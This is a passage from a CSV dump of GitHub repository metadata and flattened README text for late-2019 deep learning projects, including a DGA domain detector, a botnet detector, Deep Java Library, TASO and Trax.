dense88 Dense None 48 24624 Total params 99 312 Trainable params 99 312 Non trainable params 0 Model lotomodelnum5 h5 Model sequential6 Layer type Output Shape Param flatten6 Flatten None 4 0 dense24 Dense None 64 320 dense25 Dense None 256 16640 dense26 Dense None 512 131584 dense27 Dense None 49 25137 Total params 173 681 Trainable params 173 681 Non trainable params 0 Model lotomodelnum6 h5 Model sequential30 Layer type Output Shape Param flatten30 Flatten None 4 0 dense101 Dense None 64 320 dense102 Dense None 256 16640 dense103 Dense None 512 131584 dense104 Dense None 50 25650 Total params 174 194 Trainable params 174 194 Non trainable params 0 Results alt text https github com heg37 SayisalLotoMLexperiment blob master resulttable jpg result table The reults of the our Neural Network alt text https github com heg37 SayisalLotoMLexperiment blob master testtrain 20graph png testtrain graph This has calculated from test accuracy train accuracy alt text https github com heg37 SayisalLotoMLexperiment blob master releation 20graph png testtrain graph In the results I find a inverse relation between train and test graphics Conclusion We have tried to find a releation in lottery I want to focus on 1st ball since best result So we can ask with this work if everythings happening randomy how can a Machine find 11 true results Maybe this work shows nothing truely but you can look this project as an experiment Please feel free to comment about this work and try your new Neural Network and enjoy,2019-11-09T12:51:27Z,2019-11-14T18:31:37Z,Python,heg37,User,1,1,0,21,master,heg37,1,0,0,0,0,0,0
sudo-rushil,dga-intel-web,cnn#deep-learning#keras#lstm#lstm-cnn#machine-learning#tensorflow,DGA Intel This deep learning model uses a CNN LSTM architecture to predict whether a given domain name is genuine or was artificially generated by a DGA The Problem Many forms of malware uses domain generation algorithms DGAs to connect with a C C which enables it to recieve instructions and perform malicious activities There have been many attempts to detect whether a given domain name corresponds to a genuine domain or a fake domain generated by a DGA Some machine learning methods have utilized clustering based on WHOIS data etc to this end This model builds on past work by using a deep learning architecture to achieve increased accuracy over other methods The Model This model was based on an architecture from 2 and implemented in Tensorflow It embeds domain names feeds the embeddings through a convolutional network feeds that through an LSTM and passes that through a dense layer for classification This approach captures the local similarity inherent in genuine domains as well as spatial connections between characters The Data The training data was a set of 1 5 million domain names labelled as either 0 genuine or 1 fake from the Splunk DGA app Alexa s top 1 million domains and the Bambenek DGA feed 10 of domains were stripped of their TLD and subdomain before being fed through the model The test data was a set of 100000 domains from a different slice of this data Results The model was trained for twenty epochs with the Adam optimizer It was tested by evaluating its predictive accuracy on 100000 domains from the shuffled test datasets It achieved 98 8 accuracy on the test data Website Usage You can query whether a given domain is legit or fake through this model at http dgaintel com Development The model can be loaded through Tensorflow s Keras API from the domainclassifiermodel h5 file To further experiment with the code 1 Go to Google Colab 2 Go to File Open Notebook Github 3 Search for https github com sudo rushil dga intel 4 Open domaindata ipynb or domainmodel ipynb Code Usage git clone https github com sudo rushil dga intel cd dga intel python predictdomain py domain name Example python predictdomain py wikipedia com The domain wikipedia com is genuine with probability 1 0 Contact If you run across any issues file an issue at https github com sudo rushil dga intel issues My LinkedIn page can be found here https www linkedin com in rushil mallarapu References 1 Abadi et al TensorFlow Large scale machine learning on heterogeneous systems 2015 Software available from tensorflow org 2 Yu Bin Pan Jie Hu Jiaming Nascimento Anderson De Cock Martine Character Level based Detection of DGA Domain Names 2018 International Joint Conference on Neural Networks IJCNN,2019-11-06T03:52:50Z,2019-12-09T04:28:35Z,JavaScript,sudo-rushil,User,1,1,0,40,master,sudo-rushil#ravi-mallarapu,2,0,0,0,0,0,0
ZKDeep,images_train_test_valid_split,n/a,imagestraintestvalidsplit You have single Class wise image Directory for deep learning and want to split it into train test and validation You can easily do it with this script 1 Select the directory in which you have class wise folders that are not split into train test and validation 2 import the imagestraintestvalidsplit py 3 call the function imagestraintestvalidsplit and pass two parameters a targetdirectory where the class wise dataset is available b a list describing train test split ratio for instance 0 30 0 20 first index value is the percentage split from train to test and the second index value is the percentage split for train to validation 4 All is done and you have Train test and valid split folders of images from main dataset,2019-11-28T15:30:44Z,2019-11-28T15:47:06Z,Python,ZKDeep,User,1,1,0,5,master,ZKDeep,1,0,0,0,0,0,0
daekeun-ml,tfs-workshop,n/a,Deep Learning Inference Hands on Lab Introduction Amazon SageMaker inference SageMaker on premise model zoo pre trained Docker Amazon SageMaker Endpoint auto scaling A B high availability TensorFlow MXNet PyTorch Amazon SageMaker Endpoint 1 getstarted md 2 TensorFlow Endpoint tensorflow serving endpoint ipynb License Summary MIT 0 LICENSE,2019-11-23T13:59:19Z,2019-11-26T04:12:23Z,Jupyter Notebook,daekeun-ml,User,1,1,0,0,master,,0,0,0,0,0,0,0
efliu,School-Staffing-Optimization,n/a,School Staffing Optimization A deep learning model which optimizes California public school districts financial resource allocations toward different personnel categories for the purpose of academic achievement maximization Summary Our objective was to raise state wide school achievement levels as defined by the percent of students meeting ELA and math benchmarks via data driven staff funding in the California public school system First we gathered data on current district achievement levels and staffing distributions teacher staff support administrators counselors librarians student support by scraping multiple public websites and search engines Then we ran the datasets through an MLP neural network to generate a model that can predict student performance based on staffing Finally we ran a BFGS optimization algorithm on the model to find the optimal staffing distribution for each district constrained by their current expenses and achievement levels This work strives to guide public school district committees in optimizing decreasing wage expenses to produce positive educational impact Considerations for the future include additional data collection and model testing Link to our brief pitch deck https docs google com presentation d 1oVsAik8fJ3zPOwUymh7Yt 7yNIbdRXyawmYxzazF4YQ edit usp sharing Seena Saiedian Edward Liu and Mehul Raheja s project at the 2019 DSS x IBM Datathon for Social Good at the University of California Berkeley,2019-11-09T02:01:02Z,2019-11-14T23:06:16Z,Jupyter Notebook,efliu,User,2,1,1,77,master,efliu#seena00#mraheja,3,0,0,0,0,0,0
RualPerez,AutoML,n/a,AutoML Deep Reinforcement Learning for Efficient Neural Architecture Search ENAS in PyTorch i e AutoML Code based on the paper https arxiv org abs 1802 03268,2019-11-20T13:56:52Z,2019-11-28T14:21:35Z,Jupyter Notebook,RualPerez,User,1,1,0,2,master,RualPerez,1,0,0,0,0,0,0
hari047,Botnet-Detection-Using-ML,n/a,Botnet Detection Using ML Built a Botnet Detector that applies Deep Learning to assess a dataset and train itself to identify the existence of bots in a network by analyzing the IRC traffic using the signatures of bots Programmed a flow based feature system that performs with different accuracies based on the algorithm being chosen for classification Data flow diagrams image https user images githubusercontent com 40194788 71158945 d1cd6c80 226a 11ea 87dd ec7b9aa4bab1 png Fig1 Level 0 of the flow diagram image https user images githubusercontent com 40194788 71158983 e4e03c80 226a 11ea 831b c7c7ce19b6a7 png Fig 2 Level 1 of the flow diagram image https user images githubusercontent com 40194788 71159042 fb869380 226a 11ea 9b20 b6180739579e png Fig 3 Level 2 of the data flow diagram for Flow Generator,2019-11-08T14:25:17Z,2019-11-30T12:50:13Z,n/a,hari047,User,1,1,0,19,master,hari047,1,0,0,0,0,0,1
Russell-Tran,CS221_find_water,n/a,Stanford CS 221 Principles of Artificial Intelligence Final Project Finding Water in Minecraft Lydia Chan https github com LydiaChan528 Russell Tran https github com Russell Tran 13 December 2019 We use Deep Q Learning DQN to train an agent to search for bodies of water in the video game Minecraft The agent reads in raw pixel inputs and has the controls of a normal player Directory code Run the training algorithms and simulate Minecraft To run call python3 findwaterbaseline py findwaterdqn0 py findwaterqlearning py environments These are the xml files which represent different Minecraft worlds environments in which the agent can roam These xml files are parsed by Minecraft Malmo refer to their documentation for the formatting The MineRL platform is capable of taking these Minecraft Malmo environments which Malmo calls missions and using them as OpenAI gym environmetns out Data output on our runs poster data Assets for our poster Below are the necessary dependencies for macOS and Windows tensorflow 1 14 minerl 0 2 9 pandas 0 24 8 gym 0 15 3 mujoco py 2 0 2 8 mpi4py 3 0 3 baselines 0 1 5 lxml 4 4 1 psutil 5 6 2,2019-11-23T02:11:24Z,2019-12-14T07:20:43Z,Jupyter Notebook,Russell-Tran,User,2,1,0,49,master,Russell-Tran#LydiaChan528,2,0,0,0,0,0,0
kennedykwangari,Snapshot-Serengeti-Indaba-DL-2019-Hackathon,n/a,Snapshot Serengeti Indaba DL 2019 Hackathon We were tasked to build a state of the art deep learning model that seeks to inform support and accelerate Wildlife Conservation and Ecological Research in the Serengeti National Park in Tanzania,2019-11-20T12:42:26Z,2019-11-20T13:05:31Z,Jupyter Notebook,kennedykwangari,User,1,1,0,2,master,kennedykwangari,1,0,0,0,0,0,0
chloerobotics,Intro2PyTorch4Vision,n/a,Intro2PyTorch4Vision This is an adaptation of the Pytorch Tutorial originally used as an introduction to Deep Learning for Computer Vision for Course BMI 260 at Stanford written by Carson Lam from Stanford Follow install instructions and see original tutorial here http pytorch org Why do we use PyTorch Tensorflow for Deep learning,2019-11-14T06:48:53Z,2019-11-28T04:56:08Z,Jupyter Notebook,chloerobotics,User,1,1,0,3,master,chloerobotics,1,0,0,0,0,0,0
tdelv,Image-Colorization,n/a,Image Colorization A deep learning framework based on previous research https arxiv org pdf 1705 02999 pdf to create realistic colorizations of black and white images based on minimal user input Team Shenandoah Duraideivamani sduraide Thomas Del Vecchio tdelvecc Geoffrey Glass gglass Mia Santomauro msantoma To Do Preprocessing Model Training testing User interaction,2019-11-14T18:01:51Z,2019-12-12T20:50:01Z,Python,tdelv,User,1,1,0,80,master,tdelv#miasantomauro,2,0,0,0,0,0,6
maximelaharrague,comsw4995-fall19-pointer-tsp,n/a,Overview This project introduces an approach for trying to solve the Traveling Salesman Problem with graph convolutional and sequence to sequence networks The first step relies mostly on an approach followed by C K Joshi T Laurent and X Bresson aiming at building efficient TSP graph representations with Graph ConvNets on top of which we tried to implement a structure described as Pointer Network by O Vinyals M Fortunato N Jaitly This project was conducted in the context of a Deep Learning course taught by Pr Iddo Drori from the Columbia University Computer Science Department Main parts of our code and notebooks have been taken and inspired from previous work from C K Joshi T Laurent and X Bresson which could be found on the following repository https github com chaitjo graph convnet tsp installation Please refer to our final report finalreportproject pdf for further details on our work Usage Installation The below step by step guide for local installation using a Terminal Mac Linux or Git Bash Windows has been imported from C K Joshi T Laurent and X Bresson work code block pyhon Install Anaconda 3 https www anaconda com for managing Python packages and environments curl o miniconda sh O https repo continuum io miniconda Miniconda3 latest Linux x8664 sh chmod x miniconda sh miniconda sh source bashrc Clone the repository git clone https github com chaitjo graph convnet tsp git cd graph convnet tsp Set up a new conda environment and activate it conda create n gcn tsp env python 3 6 7 source activate gcn tsp env Install all dependencies and Jupyter Lab for using notebooks conda install pytorch 0 4 1 cuda90 c pytorch conda install numpy 1 15 4 scipy 1 1 0 matplotlib 3 0 2 seaborn 0 9 0 pandas 0 24 2 networkx 2 2 scikit learn 0 20 2 tensorflow gpu 1 12 0 tensorboard 1 12 0 Cython pip3 install tensorboardx 1 5 fastprogress 0 1 18 conda install c conda forge jupyterlab,2019-11-09T22:04:10Z,2019-12-07T17:25:58Z,Jupyter Notebook,maximelaharrague,User,1,1,0,22,master,tmsgaillard#maximelaharrague,2,0,0,0,0,0,4
Urban-Analytics,data-driven-car-following,n/a,data driven car following Development of parametric deep learning and reinforcement learning agent based model of car following behaviour The models aim to be data driven and take into account the heterogeneity of drivers behaviour and vehicle types Potential future applications include investigation of a mixed traffic of human driven vehicles and autonomous vehicles,2019-11-07T10:25:33Z,2019-12-11T08:57:47Z,Jupyter Notebook,Urban-Analytics,Organization,4,1,0,5,master,leminhkieu,1,0,0,0,0,0,0
numancelik34,anomaly-detection,n/a,Anomaly detection Anomaly detection is a common problem that is applied to machine learning deep learning research Here we will apply an LSTM autoencoder AE to identify ECG anomaly detections In our experiments anomaly detection problem is a rare event classification problem Therefore we will train our LSTM AE with major class then we would have a higher mean squared error when model sees a minor class in the dataset The proposed LSTM autoencoder model was trained on ECG signal sequences those obtained from MIT database normal patients The data files are under the training folder in this repository Then the model was evauated on random data files that includes ECG signal sequences and the mean squared errors are calculated as loss functions after reconstructing the ECG signals In the LSTMAE py file we are attempting to identify a rare event classification problem in the given outfinaltest62 csv file where class 0 is a minor class in the dataset Dependencies Python 3 5 or over Keras tensorflow backend numpy pandas sckitlearn and matplotlib libraries This model can also be used for anomaly detection of other types of modalities such as detecting abnormalities in an image loss in banking management or destruction in sentiment analysis,2019-11-26T09:34:09Z,2019-12-13T20:07:28Z,Python,numancelik34,User,1,1,0,8,master,numancelik34,1,0,0,0,1,0,0
jajohn7m,twitter_dataset_creator,n/a,twitterdatasetcreator I was in need of up to date datasets to use in learning Data Science I will use this tool to get tweets with a specific keyword and even location parameters to get geographic targeted tweets This data is saved into a database that will not be saved in my repository The data is used only for my future learning in Data Science and Deep Learning This tool however will be saved here so that i can push how updates and keep orginized To use this tool you will need to generate your own keys with Twitter Constructive Feedback is Welcomed Thank you This program will gets tweets in realtime using Twitter Stream I have omited my Keys from the program as you will need to create those yourself by signing into twitter as a Developer This program is not perfect and could use some extra attention to assist in speed clean data and accuracy It is my goal to maintain this and push out weekly updates Thank You The Developer Planned Updates These are just future plans for this application It is my Hope that as the developer i keep pushing myself to push updates Constructive Feed back is Welcomed Version 1 1 Update Cleaner data Version 1 2 Update Speed Version 1 3 Update Accuracy Version 1 4 Update Error Checking and Bug reduction Version 1 5 Update Adding GUI Interface Version 1 6 Update Adding GUI Users Login Version 1 7 Update Database Viewer Editor Version 1 8 Update How to implement Deep learning Faster Automation Version 1 9 Update Faster Automation Deep learning Version 2 0 Update Mile Stone Bug Fixes,2019-11-16T20:28:39Z,2019-11-18T10:31:05Z,Python,jajohn7m,User,1,1,0,4,master,jajohn7m,1,0,0,0,0,0,1
chenqianben,Project-MRI-Segmentation,n/a,Title Development of automated analysis tool for quantitative MRI images in the assessment of lumbar disc degeneration in sheep Context Discogenic low back pain named discogenic lombalgia is a major public health concern that is frequently associated with lumbar intervertebral disc degenerative disease DDD Numerous tools and animal models have been used to help us improve our understanding of the DDD physiopathology and develop imaging methods to detect it as early as possible The sheep has been shown to be a valuable large animal model thanks to the similarities gross anatomy mechanical properties of its lumbar intervertebral disc IVD with those of human lumbar IVD In parallel quantitative magnetic resonance imaging MRI seems to be a clinically relevant tool to explore early DDD in particular T2 relaxation time measurements During preliminary study we compared three MRI methods of quantitative time measurements evaluation of lumbar ovine IVD T1 T2 and T2 using different manually drawn region of interest ROI Interestingly while T2 and T2 mapping are well described to characterize the DDD in various species our preliminary data strongly suggest that T1 mapping using the variable flip angle could be a promising tool to specifically assess the early events of DDD in an ovine model and maybe in human patient Objectives Regarding the time consuming analysis of data and opportunity offered with the deep learning approach the objective of this project is to develop an automated analysis program of MRI images based on sheep image database acquired during manually preliminary study In particular the developed methods will contribute to the segmentation of the disc within the database Kerwords Intervertebral disc disc degeneration MRI sequences MRI mapping automated analysis image segmentation machine learning,2019-12-14T15:08:46Z,2019-12-14T15:18:02Z,Python,chenqianben,User,1,1,0,4,master,chenqianben,1,0,0,0,0,0,0
Noob-can-Compile,Facial_Keypoint_Detection,n/a,Facial Keypoint Detection Here we re defining and training a convolutional neural network to perform facial keypoint detection and using computer vision techniques to transform images of faces The first step in any challenge like this will be to load and visualize the data you ll be working with Let s take a look at some examples of images and corresponding facial keypoints Facial keypoints also called facial landmarks are the small magenta dots shown on each of the faces in the image above In each training and test image there is a single face and 68 keypoints with coordinates x y for that face These keypoints mark important areas of the face the eyes corners of the mouth the nose etc These keypoints are relevant for a variety of tasks such as face filters emotion recognition pose recognition and so on Here they are numbered and you can see that specific ranges of points match different portions of the face Local Environment Instructions 1 Clone the repository and navigate to the downloaded folder This may take a minute or two to clone due to the included image data https github com Noob can Compile FacialKeypointDetection git cd P1FacialKeypoints 2 Create and activate a new environment named cv nd with Python 3 6 If prompted to proceed with the install Proceed y n type y Linux or Mac conda create n cv nd python 3 6 source activate cv nd Windows conda create name cv nd python 3 6 activate cv nd At this point your command line should look something like cv nd P1FacialKeypoints The cv nd indicates that your environment has been activated and you can proceed with further package installations 3 Install PyTorch and torchvision this should install the latest version of PyTorch Linux or Mac conda install pytorch torchvision c pytorch Windows conda install pytorch cpu c pytorch pip install torchvision 6 Install a few required pip packages which are specified in the requirements text file including OpenCV pip install r requirements txt Data All of the data you ll need to train a neural network is in the Facial Keypoint Detection repo in the subdirectory data In this folder are training and tests set of image keypoint data and their respective csv files This will be further explored in Notebook 1 Loading and Visualizing Data and you re encouraged to look trough these folders on your own too Notebooks 1 Navigate back to the repo Also your source environment should still be activated at this point shell cd cd FacialKeypointDetection 2 Open the directory of notebooks using the below command You ll see all of the project files appear in your local environment open the first notebook and follow the instructions shell jupyter notebook 3 Once you open any of the project notebooks make sure you are in the correct cv nd environment by clicking Kernel Change Kernel cv nd,2019-11-30T15:01:04Z,2019-12-03T03:14:49Z,Jupyter Notebook,Noob-can-Compile,User,1,1,0,7,master,Noob-can-Compile,1,0,0,0,0,0,1
tidaltamu,microstructure-zoo,n/a,microstructure zoo Use a massive amount of microstructural images to train a deep learning model to be able to classify new microstructure images This requires microstructure images to be classified prior to model training The important features in images will be extracted and used as the classifier,2019-11-21T14:31:05Z,2019-12-05T13:14:06Z,n/a,tidaltamu,Organization,0,1,0,1,master,benrudz,1,0,0,0,0,0,0
TejasMorbagal,CUDAVISION-LAB,n/a,CUDAVISION LAB Due to the availability of general purpose programming interfaces like CUDA the immense speed of graphics cards can be put to work for a multitude of parallel tasks Algorithms for the analysis of images mostly work independently on different regions of an image These algorithms are therefore inherently parallel and can greatly profit from parallel hardware Speedup factors in the order of two magnitudes make it possible to process and extract information from huge datasets for example the images of the ImageNet Large Scale Visual Recognition Challenge When experimenting with learning algorithms the experiment duration is drastically reduced In the Lab we learn how to implement learning algorithms from the area of visual pattern recognition and accelerate them using graphics processing unit GPU We will implement learning algorithms with the help of PyTorch which is a popular deep learning framework,2019-12-03T11:43:50Z,2019-12-08T18:37:11Z,Jupyter Notebook,TejasMorbagal,User,1,1,0,3,master,TejasMorbagal,1,0,0,0,0,0,0
awslabs,djl,ai#autograd#deep-learning#deep-neural-networks#djl#java#machine-learning#ml#mxnet#neural-network,DeepJavaLibrary website img deepjavalibrary png raw true Deep Java Library https github com awslabs djl workflows nightly 20build badge svg Deep Java Library DJL Overview Deep Java Library DJL is an open source high level framework agnostic Java API for deep learning DJL is designed to be easy to get started with and simple to use for Java developers DJL provides a native Java development experience and functions like any other regular Java library You don t have to be machine learning deep learning expert to get started You can use your existing Java expertise as an on ramp to learn and use machine learning and deep learning You can use your favorite IDE to build train and deploy your models DJL makes it easy to integrate these models with your Java applications Because DJL is deep learning framework agnostic you don t have to make a choice between frameworks when creating your projects You can switch frameworks at any point To ensure the best performance DJL also provides automatic CPU GPU choice based on hardware configuration DJL s ergonomic API interface is designed to guide you with best practices to accomplish deep learning tasks The following pseudocode demonstrates running inference java Assume user uses a pre trained model from model zoo they just need to load it Map criteria new HashMap criteria put layers 18 criteria put flavor v1 Load pre trained model from model zoo try Model model MxModelZoo RESNET loadModel criteria try Predictor predictor model newPredictor BufferedImage img readImage read image Classifications result predictor predict img get the classification and probability The following pseudocode demonstrates running training java Construct your neural network with built in blocks Block block new Mlp 28 28 try Model model Model newInstance Create an empty model model setBlock block set neural network to model Get training and validation dataset MNIST dataset Dataset trainingSet new Mnist Builder setUsage Usage TRAIN build Dataset validateSet new Mnist Builder setUsage Usage TEST build Setup training configurations such as Initializer Optimizer Loss TrainingConfig config setupTrainingConfig try Trainer trainer model newTrainer config Configure input shape based on dataset to initialize the trainer 1st axis is batch axis we can use 1 for initialization MNIST is 28x28 grayscale image and pre processed into 28 28 NDArray Shape inputShape new Shape 1 28 28 trainer initialize new Shape inputShape TrainingUtils fit trainer epoch trainingSet validateSet Save the model model save modelDir mlp Getting Started Start with a PreTrained Object Detection Model examples docs objectdetection md Start with Jupyter Notebooks jupyter README md Resources Documentation docs README md documentation JavaDocs https javadoc djl ai Release Notes 0 2 1 https github com awslabs djl releases tag v0 2 1 0 2 0 Initial release https github com awslabs djl releases tag v0 2 0 Building From Source To build from source begin by checking out the code Once you have checked out the code locally you can build it as follows using Gradle sh gradlew build To increase build speed you can use the following command to skip unit tests sh gradlew build x test Note SpotBugs is not compatible with JDK 11 SpotBugs will not be executed if you are using JDK 11 Slack channel Join our slack channel https deepjavalibrary slack com join sharedinvite enQtODQyOTYxNDExMTA3LWE5YjVlMWFmNTk3ZTJjNTE4NDIwNDc4NjA2MjZkM2VmM2M3MjI4MTFiMzFkOTVlZTM1NGVlZTI0OTlkNjhhNDI to get in touch with the development team for questions and discussions License This project is licensed under the Apache 2 0 License,2019-10-29T22:38:54Z,2019-12-14T13:51:15Z,Java,awslabs,Organization,22,343,33,1031,master,frankfliu#lanking520#stu1130#zachgk#keerthanvasist#roywei#IvyBazan#vrakesh#ddavydenko#amazon-auto#larroy,11,2,3,3,1,1,6
HasnainRaz,Fast-SRGAN,artificial-intelligence#cnn#fastsrgan#gans#generative-adversarial-network#neural-network#realtime-super-resolution#residual-blocks#resolution-image#single-image-super-resolution#sisr#srgan#super-resolution#tensorboard#tensorflow#tf-keras#tf2#upsample,Fast SRGAN The goal of this repository is to enable real time super resolution for upsampling low resolution videos Currently the design follows the SR GAN https arxiv org pdf 1609 04802 pdf architecture But instead of residual blocks inverted residual blocks are employed for parameter efficiency and fast operation This idea is somewhat inspired by Real time image enhancement GANs http www micc unifi it seidenari wp content papercite data pdf caip2019 pdf The training setup looks like the following diagram Speed Benchmarks The following runtimes fps are obtained by averaging runtimes over 800 frames Measured on a GTX 1080 Input Image Size Output Size Time s FPS 128x128 512x512 0 019 52 256x256 1024x1024 0 034 30 384x384 1536x1536 0 068 15 We see it s possible to upsample to 720p at around 30fps Requirements This was tested on Python 3 7 To install the required packages use the provided requirements txt file like so bash pip install r requirements txt Pre trained Model A pretrained generator model on the DIV2k dataset is provided in the models directory It uses 6 inverted residual blocks with 32 filters in every layer of the generator Upsampling is done via phase shifts in the low resolution space for speed To try out the provided pretrained model on your own images run the following bash python infer py imagedir path to your image directory outputdir path to save super resolution images Training To train simply execute the following command in your terminal bash python main py imagedir path to image directory hrsize 384 lr 1e 4 saveiter 200 epochs 10 batchsize 14 Model checkpoints and training summaries are saved in tensorboard To monitor training progress open up tensorboard by pointing it to the logs directory that will created when you start training Samples Following are some results from the provided trained model Left shows the low res image after 4x bicubic upsampling Middle is the output of the model Right is the actual high resolution image 384x384 to 1536x1536 Upsampling 256x256 to 1024x1024 Upsampling 128x128 to 512x512 Upsampling Extreme Super Resolution Upsampling HQ images 4x as a check to see the image is not destroyed since the network is trained on low quality it should also upsample high quality images while preserving their quality Changing Input Size The provided model was trained on 384x384 inputs but to run it on inputs of arbitrary size you ll have to change the input shape like so python from tensorflow import keras Load the model model keras models loadmodel models generator h5 Define arbitrary spatial dims and 3 channels inputs keras Input None None 3 Trace out the graph using the input outputs model inputs Override the model model keras model Model inputs outputs Now you are free to predict on images of any size Contributing If you have ideas on improving model performance adding metrics or any other changes please make a pull request or open an issue I d be happy to accept any contributions,2019-10-20T16:41:22Z,2019-12-08T03:05:05Z,Python,HasnainRaz,User,9,259,25,29,master,HasnainRaz,1,0,0,0,5,0,0
jiazhihao,TASO,deep-learning#deep-neural-networks#inference-optimization,TASO A Tensor Algebra SuperOptimizer for Deep Learning TASO optimizes the computation graphs of DNN models using automatically generated and verified graph transformations For an arbitrary DNN model TASO uses the auto generated graph transformations to build a large search space of potential computation graphs that are equivalent to the original DNN model TASO employs a cost based search algorithm to explore the space and automatically discovers highly optimized computation graphs TASO outperforms the graph optimizers in existing deep learning frameworks by up to 3x http theory stanford edu aiken publications papers sosp19 pdf End to end inference performance comparison on a NVIDIA V100 GPU Install TASO See instructions https github com jiazhihao TASO blob master INSTALL md to install TASO from source We also provide prebuilt docker images https github com jiazhihao TASO blob master INSTALL md with all dependencies pre installed Use TASO TASO can directly optimize any pre trained DNN models in ONNX https onnx ai TensorFlow https www tensorflow org guide savedmodel and PyTorch https pytorch org docs stable onnx html graph formats TASO also provides a Python interface for optimizing arbitrary DNN architectures TASO supports exporting the optimized computation graphs to ONNX which can be directly used as inputs by most existing deep learning frameworks Optimize ONNX Models TASO can directly optimize pre trained ONNX models and this can be done in just a few lines of Python code The following code snippet shows how to load a pre trained DNN model from ONNX optimize the model and save the optimized model into a ONNX file python import taso import onnx oldmodel taso loadonnx path to load onnx model tasograph taso optimize oldmodel newmodel taso exportonnx tasograph onnx save newmodel path to save new onnx model The optimized model has the same accuracy as the original and can be directly used by existing deep learning frameworks Some original and TASO optimized ONNX files are available in the onnx folder Optimize TensorFlow Models TASO can optimize TensorFlow models by converting the model to ONNX using tf2onnx https github com onnx tensorflow onnx First install tf2onnx from PyPi as follows or from source https github com onnx tensorflow onnx pip install U tf2onnx Second convert a TensorFlow model to ONNX using tf2onnx python m tf2onnx convert saved model path to tensorflow saved model output path to onnx model file Third use TASO to optimize the model in ONNX by following the above instructions https github com jiazhihao TASO optimize onnx models Optimize PyTorch Models PyTorch has built in support for ONNX as a part of the torch onnx https pytorch org docs master onnx html package TASO can directly optimize PyTorch models in the ONNX format Optimize Arbitrary DNN Models using the Python Interface TASO can also optimize arbitrary DNN architectures using the TASO Python interface The following code snippet builds the left most DNN graph depicted in the figure TASO automatically performs a series of non trivial transformations and eventually discovers the right most DNN graph which is 1 3x faster on a V100 GPU More DNN examples are available in the examples folder python import taso import onnx Build DNN model graph taso newgraph input graph newinput dims 1 128 56 56 w1 graph newweight dims 128 128 3 3 w2 graph newweight dims 128 128 1 1 w3 graph newweight dims 128 128 3 3 left graph conv2d input input weight w1 strides 1 1 padding SAME activation RELU left graph conv2d input input weight w3 strides 1 1 padding SAME right graph conv2d input input weight w2 strides 1 1 padding SAME activation RELU output graph add left right output graph relu output Optimize DNN model newgraph taso optimize graph onnxmodel taso exportonnx newgraph onnx save onnxmodel path to save new onnx model Publication Zhihao Jia Oded Padon James Thomas Todd Warszawski Matei Zaharia and Alex Aiken TASO Optimizing Deep Learning Computation with Automated Generation of Graph Substitutions https cs stanford edu zhihao papers sosp19 pdf In Proceedings of the Symposium on Operating Systems Principles SOSP Ontario Canada October 2019 Zhihao Jia James Thomas Todd Warszawski Mingyu Gao Matei Zaharia and Alex Aiken Optimizing DNN Computation with Relaxed Graph Substitutions https theory stanford edu aiken publications papers sysml19b pdf In Proceedings of the Conference on Systems and Machine Learning SysML Palo Alto CA April 2019,2019-09-28T01:24:21Z,2019-12-13T22:03:57Z,C++,jiazhihao,User,15,209,16,140,master,jiazhihao#OuHangKresnik#santhnm2#olivia111#dkumazaw#Lyken17#odedp#alexaiken,8,0,0,13,14,0,11
oreilly-japan,deep-learning-from-scratch-3,n/a,DeZeroDeZero60PyTorchTensorFlowChainer img alt pypi src https img shields io pypi v dezero svg img alt MIT License src http img shields io badge license MIT blue svg img alt Build Status src https travis ci org oreilly japan deep learning from scratch 3 svg branch master dezero dezero DeZero examples examples DeZero steps steps stepstep01 py step60 py tests tests DeZero Pytnon Python 3 https docs python org 3 NumPy https numpy org Matplotlib https matplotlib org NVIDIAGPU CuPy https cupy chainer org Python steps steps Python python steps step01 py python steps step02 py cd steps python step31 py DeZero examples examples https github com oreilly japan deep learning from scratch 3 tree tanh examples spiral py https colab research google com github oreilly japan deep learning from scratch 3 blob master examples mnistcolabgpu ipynb https github com oreilly japan deep learning from scratch 3 wiki DeZero E3 82 92iPhone E3 81 A7 E5 8B 95 E3 81 8B E3 81 99 magright wiki Errata email japanoreilly co jp,2019-10-25T04:59:43Z,2019-12-13T00:43:03Z,Python,oreilly-japan,Organization,20,159,16,227,master,koki0702#c-bata#miyagawa-orj,3,0,0,1,2,0,4
google,trax,deep-learning#deep-reinforcement-learning#jax#machine-learning#numpy#reinforcement-learning#transformer,Trax mdash your path to advanced deep learning train tracks https images pexels com photos 461772 pexels photo 461772 jpeg dl fit crop crop entropy w 32 h 21 PyPI version https badge fury io py trax svg https badge fury io py trax GitHub Issues https img shields io github issues google trax svg https github com google trax issues Contributions welcome https img shields io badge contributions welcome brightgreen svg CONTRIBUTING md License https img shields io badge License Apache 202 0 brightgreen svg https opensource org licenses Apache 2 0 Trax https github com google trax helps you understand deep learning We start with basic maths and go through layers https colab research google com github google trax blob master trax layers intro ipynb models supervised and reinforcement learning We get to advanced deep learning results including recent papers and state of the art models Trax https github com google trax is a successor to the Tensor2Tensor https github com tensorflow tensor2tensor library and is actively used and maintained by researchers and engineers within the Google Brain team https research google com teams brain and a community of users We re eager to collaborate with you too so feel free to open an issue on GitHub https github com google trax issues or send along a pull request see our contribution doc CONTRIBUTING md Examples See our example layers in a TPU GPU backed colab notebook at Trax Demo https colab research google com github google trax blob master trax layers intro ipynb MLP on MNIST python m trax trainer dataset mnist model MLP config train steps 1000 Resnet50 on Imagenet python m trax trainer configfile PWD trax configs resnet50imagenet8gb gin TransformerDecoder on LM1B python m trax trainer configfile transformerlm1b8gb gin,2019-10-05T15:09:14Z,2019-12-15T02:17:14Z,Python,google,Organization,13,149,18,109,master,afrozenator#lukaszkaiser#trax-robot#wangpengmit#koz4k#pzielinski-nyc#modyharshit23#jaingaurav#jekbradbury#pkol#koz4k2,11,1,1,11,1,8,179
ElementAI,baal,n/a,Bayesian Active Learning Baal CircleCI https circleci com gh ElementAI baal svg style svg circle token aa12d3134798ff2bf8a49cebe3c855b96a776df1 https circleci com gh ElementAI baal Documentation Status https readthedocs org projects baal badge version latest https baal readthedocs io en latest badge latest Gitter https badges gitter im eai baal community svg https gitter im eai baal community utmsource badge utmmedium badge utmcampaign pr badge BaaL is an active learning library developed at ElementAI https www elementai com This repository contains techniques and reusable components to make active learning accessible for all Read the documentation at https baal readthedocs io Installation and requirements BaaL requires Python 3 6 To install baal using pip pip install baal To install baal from source pip install e For requirements please see requirements txt requirements txt What is Active Learning Active learning is a special case of machine learning in which a learning algorithm is able to interactively query the user or some other information source to obtain the desired outputs at new data points to understand the concept in more depth refer to our tutorial https baal readthedocs io en latest BaaL Framework At the moment BaaL supports the following methods to perform active learning Monte Carlo Dropout Gal et al 2015 MCDropConnect Mobiny et al 2019 Please see our Roadmap below README md roadmap subject to change depending on the community The Monte Carlo Dropout method is a known approximation for Bayesian neural 